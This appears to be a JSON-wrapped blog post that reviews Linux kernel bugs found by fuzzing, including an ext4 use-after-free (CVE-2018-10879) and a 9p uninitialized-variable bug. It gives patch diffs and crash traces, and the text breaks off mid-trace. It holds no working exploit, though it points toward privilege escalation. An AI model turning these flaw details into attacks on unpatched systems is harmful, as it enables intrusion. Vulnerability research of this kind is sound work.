{"componentChunkName":"component---src-templates-post-tsx","path":"/2018-07-20-Modern-Linux-Kernel-0day-Unkind-Exploitations-Review/","result":{"data":{"markdownRemark":{"html":"<h2 id=\"tldr\" style=\"position:relative;\"><a href=\"#tldr\" aria-label=\"tldr permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>TL;DR</h2>\n<p>Last time, I posted about 1-day vulnerability <a href=\"http://kozistr.tech/2017/10/29/LKE-CVE-2017-5123.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CVE-2017-5123</a>, waitid() arbitrary R/W with null-deref on LK v4.13.x/~v4.14.0-rc4. It just happened because there's no any sanity check whether input space (*infop exactly) is kernel-land or user-land.</p>\n<p>Also, you can find other good payloads that include sandbox-bypass like chrome-sandbox (actually, it's kinda different vulnerability, but...), fully-chained sth, etc...</p>\n<p>Anyway, recently, I've been spending some time fuzzing network and fs-related Linux kernel interfaces with <em>syzkaller</em> and <em>hand :)</em>.</p>\n<p>Actually, I didn't have enough time to fully analyze vulnerabilities &#x26; complete fully-working payloads. So, this post describes how the bug was discovered and suggesting a possible way to exploit for EoP or leak info.</p>\n<h2 id=\"founds\" style=\"position:relative;\"><a href=\"#founds\" aria-label=\"founds permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Founds</h2>\n<p>Overally, there're some bugs at <strong>(DCCP, XDP, SCTP)-socket, (ext4, 9p)-fs, mm</strong> stuffs. Information Disclosure which can lead to <em>KASLR bypass</em> at <strong>dccp_feat_xxx</strong> and <strong>hugetlb stuff</strong>, <strong>xdp_umem_create</strong>, <strong>p9_client_rpc</strong>, etc... And <strong>ext4_xattr_set_entry</strong> [CVE-2018-10879] (6/25/2018, found by syzkaller), etc...</p>\n<h2 id=\"targets\" style=\"position:relative;\"><a href=\"#targets\" aria-label=\"targets permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Targets</h2>\n<p>Most of the bugs can be worked on <em>LK v4.16.x ~ v4.18.x-rc5 (latest)</em>.</p>\n<h2 id=\"1-day-bug\" style=\"position:relative;\"><a href=\"#1-day-bug\" aria-label=\"1 day bug permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>1-day bug</h2>\n<p>Most of the bugs found by syzkaller and already patched by other people :).</p>\n<h3 id=\"ext4_xattr_set_entry\" style=\"position:relative;\"><a href=\"#ext4_xattr_set_entry\" aria-label=\"ext4_xattr_set_entry permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ext4_xattr_set_entry</h3>\n<p>Currently, it was reported by <code class=\"language-text\">Laura Pardo</code> on 6/29/2018. <a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=1596806\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CVE-2018-10879</a>.</p>\n<p>When renaming a file in <em>a crafted ext4 image</em>, <strong>UAF</strong> triggered (dangling <em>last</em> is accessed). It just fixed by checking <em>last</em> &#x26; <em>ext4 magic number</em> whether it is valid.</p>\n<p><code class=\"language-text\">file /fs/ext4/xattr.c L1598</code></p>\n<p><em>Before</em></p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">    <span class=\"token comment\">// LK v4.17.0+ // Fixed at LK v4.17.6</span>\n\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">!</span><span class=\"token function\">IS_LAST_ENTRY</span><span class=\"token punctuation\">(</span>last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> last <span class=\"token operator\">=</span> <span class=\"token function\">EXT4_XATTR_NEXT</span><span class=\"token punctuation\">(</span>last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>last<span class=\"token operator\">-></span>e_value_inum <span class=\"token operator\">&amp;&amp;</span> last<span class=\"token operator\">-></span>e_value_size<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token class-name\">size_t</span> offs <span class=\"token operator\">=</span> <span class=\"token function\">le16_to_cpu</span><span class=\"token punctuation\">(</span>last<span class=\"token operator\">-></span>e_value_offs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>offs <span class=\"token operator\">&lt;</span> min_offs<span class=\"token punctuation\">)</span>\n\t\t\t\tmin_offs <span class=\"token operator\">=</span> offs<span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span></code></pre></div>\n<p><em>After</em></p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">    <span class=\"token comment\">// LK v4.18.0-rc5</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">!</span><span class=\"token function\">IS_LAST_ENTRY</span><span class=\"token punctuation\">(</span>last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> last <span class=\"token operator\">=</span> next<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        next <span class=\"token operator\">=</span> <span class=\"token function\">EXT4_XATTR_NEXT</span><span class=\"token punctuation\">(</span>last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>next <span class=\"token operator\">>=</span> s<span class=\"token operator\">-></span>end<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token function\">EXT4_ERROR_INODE</span><span class=\"token punctuation\">(</span>inode<span class=\"token punctuation\">,</span> <span class=\"token string\">\"corrupted xattr entries\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            ret <span class=\"token operator\">=</span> <span class=\"token operator\">-</span>EFSCORRUPTED<span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">goto</span> out<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>last<span class=\"token operator\">-></span>e_value_inum <span class=\"token operator\">&amp;&amp;</span> last<span class=\"token operator\">-></span>e_value_size<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token class-name\">size_t</span> offs <span class=\"token operator\">=</span> <span class=\"token function\">le16_to_cpu</span><span class=\"token punctuation\">(</span>last<span class=\"token operator\">-></span>e_value_offs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>offs <span class=\"token operator\">&lt;</span> min_offs<span class=\"token punctuation\">)</span>\n                min_offs <span class=\"token operator\">=</span> offs<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span></code></pre></div>\n<p><code class=\"language-text\">file /fs/ext4/xattr.c L230</code></p>\n<p><em>Before</em></p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">buffer_verified</span><span class=\"token punctuation\">(</span>bh<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">BHDR</span><span class=\"token punctuation\">(</span>bh<span class=\"token punctuation\">)</span><span class=\"token operator\">-></span>h_magic <span class=\"token operator\">!=</span> <span class=\"token function\">cpu_to_le32</span><span class=\"token punctuation\">(</span>EXT4_XATTR_MAGIC<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span>\n\t    <span class=\"token function\">BHDR</span><span class=\"token punctuation\">(</span>bh<span class=\"token punctuation\">)</span><span class=\"token operator\">-></span>h_blocks <span class=\"token operator\">!=</span> <span class=\"token function\">cpu_to_le32</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">goto</span> errout<span class=\"token punctuation\">;</span></code></pre></div>\n<p><em>After</em></p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">BHDR</span><span class=\"token punctuation\">(</span>bh<span class=\"token punctuation\">)</span><span class=\"token operator\">-></span>h_magic <span class=\"token operator\">!=</span> <span class=\"token function\">cpu_to_le32</span><span class=\"token punctuation\">(</span>EXT4_XATTR_MAGIC<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span>\n\t    <span class=\"token function\">BHDR</span><span class=\"token punctuation\">(</span>bh<span class=\"token punctuation\">)</span><span class=\"token operator\">-></span>h_blocks <span class=\"token operator\">!=</span> <span class=\"token function\">cpu_to_le32</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">goto</span> errout<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">buffer_verified</span><span class=\"token punctuation\">(</span>bh<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>Syzkaller found this bug on 6/25/2018. Here's my syzkaller's report.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">BUG<span class=\"token operator\">:</span> KASAN<span class=\"token operator\">:</span> use<span class=\"token operator\">-</span>after<span class=\"token operator\">-</span>free in ext4_xattr_set_entry<span class=\"token operator\">+</span><span class=\"token number\">0x34fc</span><span class=\"token operator\">/</span><span class=\"token number\">0x3a30</span> fs<span class=\"token operator\">/</span>ext4<span class=\"token operator\">/</span>xattr<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">1598</span>\nRead of size <span class=\"token number\">4</span> at addr ffff88002f02b046 by task syz<span class=\"token operator\">-</span>executor14<span class=\"token operator\">/</span><span class=\"token number\">14011</span>\n\nCPU<span class=\"token operator\">:</span> <span class=\"token number\">0</span> PID<span class=\"token operator\">:</span> <span class=\"token number\">14011</span> Comm<span class=\"token operator\">:</span> syz<span class=\"token operator\">-</span>executor14 Not tainted <span class=\"token number\">4.17</span><span class=\"token number\">.0</span><span class=\"token operator\">+</span> #<span class=\"token number\">9</span>\nHardware name<span class=\"token operator\">:</span> QEMU Standard <span class=\"token function\">PC</span> <span class=\"token punctuation\">(</span>i440FX <span class=\"token operator\">+</span> PIIX<span class=\"token punctuation\">,</span> <span class=\"token number\">1996</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> BIOS <span class=\"token number\">1.10</span><span class=\"token number\">.2</span><span class=\"token operator\">-</span><span class=\"token number\">1u</span>buntu1 <span class=\"token number\">04</span><span class=\"token operator\">/</span><span class=\"token number\">01</span><span class=\"token operator\">/</span><span class=\"token number\">2014</span>\nCall Trace<span class=\"token operator\">:</span>\n\nThe buggy address belongs to the page<span class=\"token operator\">:</span>\npage<span class=\"token operator\">:</span>ffffea0000bc0ac0 count<span class=\"token operator\">:</span><span class=\"token number\">0</span> mapcount<span class=\"token operator\">:</span><span class=\"token operator\">-</span><span class=\"token number\">128</span> mapping<span class=\"token operator\">:</span><span class=\"token number\">0000000000000000</span> index<span class=\"token operator\">:</span><span class=\"token number\">0x1</span>\nflags<span class=\"token operator\">:</span> <span class=\"token number\">0x100000000000000</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nraw<span class=\"token operator\">:</span> <span class=\"token number\">0100000000000000</span> ffffea0001174ec8 ffffea0001561e08 <span class=\"token number\">0000000000000000</span>\nraw<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000001</span> <span class=\"token number\">0000000000000000</span> <span class=\"token number\">00000000ffff</span>ff7f <span class=\"token number\">0000000000000000</span>\npage dumped because<span class=\"token operator\">:</span> kasan<span class=\"token operator\">:</span> bad access detected\n\nMemory state around the buggy address<span class=\"token operator\">:</span>\n ffff88002f02af00<span class=\"token operator\">:</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span>\n ffff88002f02af80<span class=\"token operator\">:</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span>\n<span class=\"token operator\">></span>ffff88002f02b000<span class=\"token operator\">:</span> ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff\n                                           <span class=\"token operator\">^</span>\n ffff88002f02b080<span class=\"token operator\">:</span> ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff\n ffff88002f02b100<span class=\"token operator\">:</span> ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff</code></pre></div>\n<h3 id=\"p9_client_rpc\" style=\"position:relative;\"><a href=\"#p9_client_rpc\" aria-label=\"p9_client_rpc permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>p9_client_rpc</h3>\n<p>syz-bot reported this bug on 7/11/2018. Bug type is an <strong>uninitialized variable</strong>.</p>\n<p>In short, we need to validate <code class=\"language-text\">p9pdu_readf</code> return-value before assigning <em>-ecode</em> to <em>err</em>. Because if <code class=\"language-text\">p9pdu_readf</code> returns <code class=\"language-text\">-EFAULT</code>, then <em>err</em> remains uninitalized.</p>\n<p><code class=\"language-text\">file /net/9p/client.c L560</code></p>\n<p><em>Before</em></p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token comment\">// LK v4.17.8</span>\n<span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n\t\terr <span class=\"token operator\">=</span> <span class=\"token function\">p9pdu_readf</span><span class=\"token punctuation\">(</span>req<span class=\"token operator\">-></span>rc<span class=\"token punctuation\">,</span> c<span class=\"token operator\">-></span>proto_version<span class=\"token punctuation\">,</span> <span class=\"token string\">\"d\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>ecode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\terr <span class=\"token operator\">=</span> <span class=\"token operator\">-</span>ecode<span class=\"token punctuation\">;</span>\n\n\t\t<span class=\"token function\">p9_debug</span><span class=\"token punctuation\">(</span>P9_DEBUG_9P<span class=\"token punctuation\">,</span> <span class=\"token string\">\"&lt;&lt;&lt; RLERROR (%d)\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span>ecode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></code></pre></div>\n<p><em>After</em></p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">I think it's not fixed yet but reported<span class=\"token punctuation\">.</span></code></pre></div>\n<p>Here's my syzkaller report.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token punctuation\">[</span>  <span class=\"token number\">155.012783</span><span class=\"token punctuation\">]</span> kmemleak<span class=\"token operator\">:</span> <span class=\"token number\">8</span> new suspected memory <span class=\"token function\">leaks</span> <span class=\"token punctuation\">(</span>see <span class=\"token operator\">/</span>sys<span class=\"token operator\">/</span>kernel<span class=\"token operator\">/</span>debug<span class=\"token operator\">/</span>kmemleak<span class=\"token punctuation\">)</span>\nBUG<span class=\"token operator\">:</span> memory leak\nferenced object <span class=\"token number\">0xffff88006695ad80</span> <span class=\"token punctuation\">(</span>size <span class=\"token number\">96</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n  comm <span class=\"token string\">\"syz-executor15\"</span><span class=\"token punctuation\">,</span> pid <span class=\"token number\">11123</span><span class=\"token punctuation\">,</span> jiffies <span class=\"token number\">4294812752</span> <span class=\"token punctuation\">(</span>age <span class=\"token number\">17.158</span>s<span class=\"token punctuation\">)</span>\n  hex <span class=\"token function\">dump</span> <span class=\"token punctuation\">(</span>first <span class=\"token number\">32</span> bytes<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n    <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> ad <span class=\"token number\">4</span>e ad de ff ff ff ff <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>N<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n    ff ff ff ff ff ff ff ff a0 <span class=\"token number\">14</span> ba a1 ff ff ff ff  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n  backtrace<span class=\"token operator\">:</span>\n    <span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span><span class=\"token number\">00000000</span>d71df12d<span class=\"token operator\">></span><span class=\"token punctuation\">]</span> p9_client_prepare_req net<span class=\"token operator\">/</span><span class=\"token number\">9</span>p<span class=\"token operator\">/</span>client<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">757</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">inline</span><span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span><span class=\"token number\">00000000</span>d71df12d<span class=\"token operator\">></span><span class=\"token punctuation\">]</span> p9_client_rpc<span class=\"token operator\">+</span><span class=\"token number\">0x1bd</span><span class=\"token operator\">/</span><span class=\"token number\">0x1410</span> net<span class=\"token operator\">/</span><span class=\"token number\">9</span>p<span class=\"token operator\">/</span>client<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">757</span>\n    <span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span><span class=\"token number\">0000000062</span>b42e0d<span class=\"token operator\">></span><span class=\"token punctuation\">]</span> p9_client_version net<span class=\"token operator\">/</span><span class=\"token number\">9</span>p<span class=\"token operator\">/</span>client<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">976</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">inline</span><span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span><span class=\"token number\">0000000062</span>b42e0d<span class=\"token operator\">></span><span class=\"token punctuation\">]</span> p9_client_create<span class=\"token operator\">+</span><span class=\"token number\">0xd0b</span><span class=\"token operator\">/</span><span class=\"token number\">0x16ce</span> net<span class=\"token operator\">/</span><span class=\"token number\">9</span>p<span class=\"token operator\">/</span>client<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">1069</span>\n    <span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span><span class=\"token number\">000000006460f</span><span class=\"token number\">58</span>e<span class=\"token operator\">></span><span class=\"token punctuation\">]</span> v9fs_session_init<span class=\"token operator\">+</span><span class=\"token number\">0x21a</span><span class=\"token operator\">/</span><span class=\"token number\">0x1960</span> fs<span class=\"token operator\">/</span><span class=\"token number\">9</span>p<span class=\"token operator\">/</span>v9fs<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">400</span>\n    <span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span><span class=\"token number\">00000000066f</span><span class=\"token number\">7e92</span><span class=\"token operator\">></span><span class=\"token punctuation\">]</span> v9fs_mount<span class=\"token operator\">+</span><span class=\"token number\">0x79</span><span class=\"token operator\">/</span><span class=\"token number\">0x860</span> fs<span class=\"token operator\">/</span><span class=\"token number\">9</span>p<span class=\"token operator\">/</span>vfs_super<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">135</span>\n    <span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span><span class=\"token number\">0000000057f</span>d6665<span class=\"token operator\">></span><span class=\"token punctuation\">]</span> mount_fs<span class=\"token operator\">+</span><span class=\"token number\">0xa7</span><span class=\"token operator\">/</span><span class=\"token number\">0x323</span> fs<span class=\"token operator\">/</span>super<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">1277</span>\n    <span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span><span class=\"token number\">0000000008124149</span><span class=\"token operator\">></span><span class=\"token punctuation\">]</span> vfs_kern_mount<span class=\"token punctuation\">.</span>part<span class=\"token punctuation\">.</span><span class=\"token number\">33</span><span class=\"token operator\">+</span><span class=\"token number\">0xc9</span><span class=\"token operator\">/</span><span class=\"token number\">0x4c0</span> fs<span class=\"token operator\">/</span>namespace<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">1037</span>\n    <span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span><span class=\"token number\">00000000110</span>ad253<span class=\"token operator\">></span><span class=\"token punctuation\">]</span> vfs_kern_mount fs<span class=\"token operator\">/</span>namespace<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">1027</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">inline</span><span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span><span class=\"token number\">00000000110</span>ad253<span class=\"token operator\">></span><span class=\"token punctuation\">]</span> do_new_mount fs<span class=\"token operator\">/</span>namespace<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">2518</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">inline</span><span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span><span class=\"token number\">00000000110</span>ad253<span class=\"token operator\">></span><span class=\"token punctuation\">]</span> do_mount<span class=\"token operator\">+</span><span class=\"token number\">0x552</span><span class=\"token operator\">/</span><span class=\"token number\">0x2ee0</span> fs<span class=\"token operator\">/</span>namespace<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">2848</span>\n    <span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span><span class=\"token number\">000000005</span>eddec36<span class=\"token operator\">></span><span class=\"token punctuation\">]</span> ksys_mount<span class=\"token operator\">+</span><span class=\"token number\">0x125</span><span class=\"token operator\">/</span><span class=\"token number\">0x140</span> fs<span class=\"token operator\">/</span>namespace<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">3064</span>\n    <span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span><span class=\"token number\">00000000</span>d4c47900<span class=\"token operator\">></span><span class=\"token punctuation\">]</span> __do_sys_mount fs<span class=\"token operator\">/</span>namespace<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">3078</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">inline</span><span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span><span class=\"token number\">00000000</span>d4c47900<span class=\"token operator\">></span><span class=\"token punctuation\">]</span> __se_sys_mount fs<span class=\"token operator\">/</span>namespace<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">3075</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">inline</span><span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">[</span><span class=\"token 